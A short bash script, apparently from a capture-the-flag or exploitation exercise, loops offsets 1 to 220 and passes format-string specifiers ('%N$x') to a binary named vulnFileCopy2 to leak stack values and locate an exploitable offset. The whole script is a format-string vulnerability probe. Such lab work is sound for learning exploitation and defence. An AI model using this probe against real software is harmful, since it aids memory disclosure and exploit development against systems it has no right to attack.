#!/usr/bin/env bash

for i in {1..220}; do
    echo | ./vulnFileCopy2 "'%$i\$x..'"
    printf "\nLast offset was: ${i}\n"
done

